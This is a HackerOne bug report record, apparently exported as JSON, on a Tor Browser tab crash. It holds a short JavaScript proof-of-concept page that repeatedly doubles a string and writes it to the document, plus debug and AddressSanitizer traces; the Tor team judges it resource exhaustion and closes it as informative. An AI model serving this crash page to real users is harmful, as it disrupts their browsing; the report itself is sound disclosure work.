{"id":281682,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODE2ODI=","url":"https://hackerone.com/reports/281682","title":"Crashes/Buffer at 0x2C0086,name=PBrowser::Msg_Destroy ","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2017-10-22T09:24:25.700Z","submitted_at":"2017-10-22T09:24:25.700Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dhiraj-mishra","url":"/dhiraj-mishra","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/049/455/364f57d6fe4bbc9ead49c2648dacc68f89a3089b_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1800,"url":"https://hackerone.com/torproject","handle":"torproject","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Tor","twitter_handle":"torproject","website":"https://www.torproject.org/","about":"Anonymity Online"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-10-24T09:42:01.243Z","bug_reporter_agreed_on_going_public_at":"2017-10-24T07:58:44.738Z","team_member_agreed_on_going_public_at":"2017-10-24T09:42:01.201Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team, \n\nSteps to Reproduce: \n1. Open Tor \n2. Navigate to string.html\nWhere string.html :\n```\n\u003cscript\u003e\nfunction tor()\n {\n  \n    var uristring = unescape(\"%u4141%u4141\");\n      \n    for(i=0; i \u003c= 50 ; ++i) \n {\n        uristring+=uristring;\n        document.write(uristring);\n    }    \n    document.write(uristring);\n}\n\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody onload=\"tor()\"\u003e\n\u003c/body\u003e\n```\n3. 'Gah! This tab has crashed.\n\nHowever, running it to debug mode generates the below exception :\n\n```\n###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23182 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268\nUnable to update the static FcBlanks: 0x0600\nUnable to update the static FcBlanks: 0x0601\nUnable to update the static FcBlanks: 0x0602\nUnable to update the static FcBlanks: 0x0603\nUnable to update the static FcBlanks: 0x06dd\nUnable to update the static FcBlanks: 0x070f\nUnable to update the static FcBlanks: 0x2028\nUnable to update the static FcBlanks: 0x2029\nUnable to update the static FcBlanks: 0xfff9\nUnable to update the static FcBlanks: 0xfffa\nUnable to update the static FcBlanks: 0xfffb\n[Parent 23125] WARNING: pipe error (58): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n[Parent 23125] WARNING: pipe error (54): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n\n###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23224 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268 \n```\n\nWFM in Debain attaching string.html and PoC for reference, request you to please have a look.\n\n\n\n\n\nRegards\nDhiraj  ","vulnerability_information_html":"\u003cp\u003eHi Team, \u003c/p\u003e\n\n\u003cp\u003eSteps to Reproduce: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen Tor \u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eNavigate to string.html\u003cbr\u003e\nWhere string.html :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\nfunction tor()\n{\n\nvar uristring = unescape(\u0026quot;%u4141%u4141\u0026quot;);\n\nfor(i=0; i \u0026lt;= 50 ; ++i) \n{\n    uristring+=uristring;\n    document.write(uristring);\n}    \ndocument.write(uristring);\n}\n\u0026lt;/script\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body onload=\u0026quot;tor()\u0026quot;\u0026gt;\n\u0026lt;/body\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u0026#39;Gah! This tab has crashed.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eHowever, running it to debug mode generates the below exception :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23182 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268\nUnable to update the static FcBlanks: 0x0600\nUnable to update the static FcBlanks: 0x0601\nUnable to update the static FcBlanks: 0x0602\nUnable to update the static FcBlanks: 0x0603\nUnable to update the static FcBlanks: 0x06dd\nUnable to update the static FcBlanks: 0x070f\nUnable to update the static FcBlanks: 0x2028\nUnable to update the static FcBlanks: 0x2029\nUnable to update the static FcBlanks: 0xfff9\nUnable to update the static FcBlanks: 0xfffa\nUnable to update the static FcBlanks: 0xfffb\n[Parent 23125] WARNING: pipe error (58): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n[Parent 23125] WARNING: pipe error (54): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322\n\n###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv\n\n[Parent 23125] WARNING: waitpid failed pid:23224 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268 \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWFM in Debain attaching string.html and PoC for reference, request you to please have a look.\u003c/p\u003e\n\n\u003cp\u003eRegards\u003cbr\u003e\nDhiraj  \u003c/p\u003e\n","weakness":{"id":3,"name":"Classic Buffer Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":231581,"file_name":"string.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/231/581/ef2670bd284815e8b3571dee847c06e08894f72d/string.html?response-content-disposition=attachment%3B%20filename%3D%22string.html%22%3B%20filename%2A%3DUTF-8%27%27string.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=69c970f901617e5094493f68931fce6b5a00b90495a0716abac74d4991dcd65d","file_size":271,"type":"text/html"},{"id":231582,"file_name":"Tor.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/231/582/eebf6cd3a8571d43b2deb50ffaece32ba7a4a7d9/Tor.mp4?response-content-disposition=attachment%3B%20filename%3D%22Tor.mp4%22%3B%20filename%2A%3DUTF-8%27%27Tor.mp4\u0026response-content-type=video%2Fx-matroska\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=f0fe721f421925b31768b46e9e70609af8bae27cf6fb9f7e0b0924ed4ec65b4f","file_size":2676752,"type":"video/x-matroska"}],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2097874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. So, this seems to be kind of a resource exhaustion attack that leads to a crash in our case? For instance if you try in a vanilla Firefox it freezes your page and if one disables multiprocess mode one can witness this behavior in a Tor Browser as well. Or what do you mean with \"Classic Buffer Overflow\"?\n\nFor what it is worth: the different behavior between Firefox and Tor Browser is caused by us disabling the crash reporter. This leads to the tab being crashed instead of getting frozen.","markdown_message":"\u003cp\u003eThanks. So, this seems to be kind of a resource exhaustion attack that leads to a crash in our case? For instance if you try in a vanilla Firefox it freezes your page and if one disables multiprocess mode one can witness this behavior in a Tor Browser as well. Or what do you mean with \u0026quot;Classic Buffer Overflow\u0026quot;?\u003c/p\u003e\n\n\u003cp\u003eFor what it is worth: the different behavior between Firefox and Tor Browser is caused by us disabling the crash reporter. This leads to the tab being crashed instead of getting frozen.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-24T06:12:19.791Z","updated_at":"2017-10-24T06:12:19.791Z","actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2097924,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, its an exhaustion attack that leads to a crash in tor, however disabling the crash report didn't gave me clear picture whether its an \"Classic Buffer Overflow\" running the debug mode as well, no much data was reveal.\n\nYes! the FF hung in this cases except FF Nightly but Tor crashes the respective tab.","markdown_message":"\u003cp\u003eYes, its an exhaustion attack that leads to a crash in tor, however disabling the crash report didn\u0026#39;t gave me clear picture whether its an \u0026quot;Classic Buffer Overflow\u0026quot; running the debug mode as well, no much data was reveal.\u003c/p\u003e\n\n\u003cp\u003eYes! the FF hung in this cases except FF Nightly but Tor crashes the respective tab.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-24T07:03:15.324Z","updated_at":"2017-10-24T07:03:15.324Z","actor":{"username":"dhiraj-mishra","cleared":false,"url":"/dhiraj-mishra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/455/364f57d6fe4bbc9ead49c2648dacc68f89a3089b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2097983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you run this under an ASan build you get\n\n```\nASAN:DEADLYSIGNAL\n=================================================================\n==3471==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f1a139f35da bp 0x7ffde74bed20 sp 0x7ffde74becf0 T0)\n    #0 0x7f1a139f35d9 in mozilla::ipc::ProcessLink::SendMessage(IPC::Message*) /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageLink.cpp:142\n    #1 0x7f1a13a0ab39 in mozilla::ipc::MessageChannel::Send(IPC::Message*) /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageChannel.cpp:791\n    #2 0x7f1a13cd7bd5 in mozilla::net::PWyciwygChannelChild::SendWriteToCacheEntry(nsString const\u0026) /home/thomas/Arbeit/Tor/tor-browser/obj-x86_64-pc-linux-gnu/ipc/ipdl/PWyciwygChannelChild.cpp:203\n    #3 0x7f1a1394bbbf in mozilla::net::WyciwygChannelChild::WriteToCacheEntry(nsAString_internal const\u0026) /home/thomas/Arbeit/Tor/tor-browser/netwerk/protocol/wyciwyg/WyciwygChannelChild.cpp:692\n    #4 0x7f1a157aa0fc in nsHTMLDocument::WriteCommon(JSContext*, nsAString_internal const\u0026, bool) /home/thomas/Arbeit/Tor/tor-browser/dom/html/nsHTMLDocument.cpp:1889\n    #5 0x7f1a157aa58b in nsHTMLDocument::WriteCommon(JSContext*, mozilla::dom::Sequence\u003cnsString\u003e const\u0026, bool, mozilla::ErrorResult\u0026) /home/thomas/Arbeit/Tor/tor-browser/dom/html/nsHTMLDocument.cpp:1806\n    #6 0x7f1a15266613 in write /home/thomas/Arbeit/Tor/tor-browser/obj-x86_64-pc-linux-gnu/dom/bindings/HTMLDocumentBinding.cpp:654\n    #7 0x7f1a153ea613 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/thomas/Arbeit/Tor/tor-browser/dom/bindings/BindingUtils.cpp:2904\n    #8 0x7f1a188ce8d3 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const\u0026) /home/thomas/Arbeit/Tor/tor-browser/js/src/jscntxtinlines.h:239\n    #9 0x7f1a188ce8d3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const\u0026, js::MaybeConstruct) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:459\n    #10 0x7f1a188cef9b in js::Call(JSContext*, JS::Handle\u003cJS::Value\u003e, JS::Handle\u003cJS::Value\u003e, js::AnyInvokeArgs const\u0026, JS::MutableHandle\u003cJS::Value\u003e) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:523\n    #11 0x7f1a186db9b8 in js::Wrapper::call(JSContext*, JS::Handle\u003cJSObject*\u003e, JS::CallArgs const\u0026) const /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Wrapper.cpp:165\n    #12 0x7f1a186b56a8 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle\u003cJSObject*\u003e, JS::CallArgs const\u0026) const /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/CrossCompartmentWrapper.cpp:333\n    #13 0x7f1a186b23a0 in js::Proxy::call(JSContext*, JS::Handle\u003cJSObject*\u003e, JS::CallArgs const\u0026) /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Proxy.cpp:400\n    #14 0x7f1a186b23a0 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Proxy.cpp:689\n    #15 0x7f1a188ceb59 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const\u0026) /home/thomas/Arbeit/Tor/tor-browser/js/src/jscntxtinlines.h:239\n    #16 0x7f1a188ceb59 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const\u0026, js::MaybeConstruct) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:447\n    #17 0x7f1a18e80b3e in DoCallFallback /home/thomas/Arbeit/Tor/tor-browser/js/src/jit/BaselineIC.cpp:6020\n    #18 0x2010796bea95  (\u003cunknown module\u003e)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageLink.cpp:142 in mozilla::ipc::ProcessLink::SendMessage(IPC::Message*)\n==3471==ABORTING\n```\nLooking at the particular code you'll see:\n```\n#ifdef MOZ_CRASHREPORTER\n      CrashReporter::AnnotateCrashReport(NS_LITERAL_CSTRING(\"IPCMessageName\"), nsDependentCString(msg-\u003ename()));\n      CrashReporter::AnnotateCrashReport(NS_LITERAL_CSTRING(\"IPCMessageSize\"), nsPrintfCString(\"%d\", msg-\u003esize()));\n#endif\n      MOZ_CRASH(\"IPC message size is too large\");\n```\nSo, what seems to be happening here is that without `--disable-crashreporter` (which is used for vanilla Firefox builds) the tab loading your code is stuck in the `#ifdef MOZ_CRASHREPORTER` block while Tor Browser (which uses `--disable-crashreporter`) is hitting the `MOZ_CRASH()` call directly.\n\nSo, I think we are fine here. What do you think?","markdown_message":"\u003cp\u003eIf you run this under an ASan build you get\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eASAN:DEADLYSIGNAL\n=================================================================\n==3471==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f1a139f35da bp 0x7ffde74bed20 sp 0x7ffde74becf0 T0)\n    #0 0x7f1a139f35d9 in mozilla::ipc::ProcessLink::SendMessage(IPC::Message*) /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageLink.cpp:142\n    #1 0x7f1a13a0ab39 in mozilla::ipc::MessageChannel::Send(IPC::Message*) /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageChannel.cpp:791\n    #2 0x7f1a13cd7bd5 in mozilla::net::PWyciwygChannelChild::SendWriteToCacheEntry(nsString const\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/obj-x86_64-pc-linux-gnu/ipc/ipdl/PWyciwygChannelChild.cpp:203\n    #3 0x7f1a1394bbbf in mozilla::net::WyciwygChannelChild::WriteToCacheEntry(nsAString_internal const\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/netwerk/protocol/wyciwyg/WyciwygChannelChild.cpp:692\n    #4 0x7f1a157aa0fc in nsHTMLDocument::WriteCommon(JSContext*, nsAString_internal const\u0026amp;, bool) /home/thomas/Arbeit/Tor/tor-browser/dom/html/nsHTMLDocument.cpp:1889\n    #5 0x7f1a157aa58b in nsHTMLDocument::WriteCommon(JSContext*, mozilla::dom::Sequence\u0026lt;nsString\u0026gt; const\u0026amp;, bool, mozilla::ErrorResult\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/dom/html/nsHTMLDocument.cpp:1806\n    #6 0x7f1a15266613 in write /home/thomas/Arbeit/Tor/tor-browser/obj-x86_64-pc-linux-gnu/dom/bindings/HTMLDocumentBinding.cpp:654\n    #7 0x7f1a153ea613 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/thomas/Arbeit/Tor/tor-browser/dom/bindings/BindingUtils.cpp:2904\n    #8 0x7f1a188ce8d3 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/js/src/jscntxtinlines.h:239\n    #9 0x7f1a188ce8d3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const\u0026amp;, js::MaybeConstruct) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:459\n    #10 0x7f1a188cef9b in js::Call(JSContext*, JS::Handle\u0026lt;JS::Value\u0026gt;, JS::Handle\u0026lt;JS::Value\u0026gt;, js::AnyInvokeArgs const\u0026amp;, JS::MutableHandle\u0026lt;JS::Value\u0026gt;) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:523\n    #11 0x7f1a186db9b8 in js::Wrapper::call(JSContext*, JS::Handle\u0026lt;JSObject*\u0026gt;, JS::CallArgs const\u0026amp;) const /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Wrapper.cpp:165\n    #12 0x7f1a186b56a8 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle\u0026lt;JSObject*\u0026gt;, JS::CallArgs const\u0026amp;) const /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/CrossCompartmentWrapper.cpp:333\n    #13 0x7f1a186b23a0 in js::Proxy::call(JSContext*, JS::Handle\u0026lt;JSObject*\u0026gt;, JS::CallArgs const\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Proxy.cpp:400\n    #14 0x7f1a186b23a0 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/thomas/Arbeit/Tor/tor-browser/js/src/proxy/Proxy.cpp:689\n    #15 0x7f1a188ceb59 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const\u0026amp;) /home/thomas/Arbeit/Tor/tor-browser/js/src/jscntxtinlines.h:239\n    #16 0x7f1a188ceb59 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const\u0026amp;, js::MaybeConstruct) /home/thomas/Arbeit/Tor/tor-browser/js/src/vm/Interpreter.cpp:447\n    #17 0x7f1a18e80b3e in DoCallFallback /home/thomas/Arbeit/Tor/tor-browser/js/src/jit/BaselineIC.cpp:6020\n    #18 0x2010796bea95  (\u0026lt;unknown module\u0026gt;)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/thomas/Arbeit/Tor/tor-browser/ipc/glue/MessageLink.cpp:142 in mozilla::ipc::ProcessLink::SendMessage(IPC::Message*)\n==3471==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking at the particular code you\u0026#39;ll see:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e#ifdef MOZ_CRASHREPORTER\n      CrashReporter::AnnotateCrashReport(NS_LITERAL_CSTRING(\u0026quot;IPCMessageName\u0026quot;), nsDependentCString(msg-\u0026gt;name()));\n      CrashReporter::AnnotateCrashReport(NS_LITERAL_CSTRING(\u0026quot;IPCMessageSize\u0026quot;), nsPrintfCString(\u0026quot;%d\u0026quot;, msg-\u0026gt;size()));\n#endif\n      MOZ_CRASH(\u0026quot;IPC message size is too large\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo, what seems to be happening here is that without \u003ccode\u003e--disable-crashreporter\u003c/code\u003e (which is used for vanilla Firefox builds) the tab loading your code is stuck in the \u003ccode\u003e#ifdef MOZ_CRASHREPORTER\u003c/code\u003e block while Tor Browser (which uses \u003ccode\u003e--disable-crashreporter\u003c/code\u003e) is hitting the \u003ccode\u003eMOZ_CRASH()\u003c/code\u003e call directly.\u003c/p\u003e\n\n\u003cp\u003eSo, I think we are fine here. What do you think?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-24T07:19:16.989Z","updated_at":"2017-10-24T07:19:16.989Z","actor":{"username":"geko","cleared":false,"url":"/geko","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"torproject","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2098022,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Agree, looks like it is getting crash at ``MOZ_CRASH()`` \nAttached poc for your reference.","markdown_message":"\u003cp\u003eAgree, looks like it is getting crash at \u003ccode\u003eMOZ_CRASH()\u003c/code\u003e \u003cbr\u003e\nAttached poc for your reference.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-24T07:46:07.819Z","updated_at":"2017-10-24T07:46:07.819Z","actor":{"username":"dhiraj-mishra","cleared":false,"url":"/dhiraj-mishra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/049/455/364f57d6fe4bbc9ead49c2648dacc68f89a3089b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":232214,"filename":"overflow.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/232/214/1fc63e551492e3bb26252117268ec2995b9b7f3e/overflow.PNG?response-content-disposition=attachment%3B%20filename%3D%22overflow.PNG%22%3B%20filename%2A%3DUTF-8%27%27overflow.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052235Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6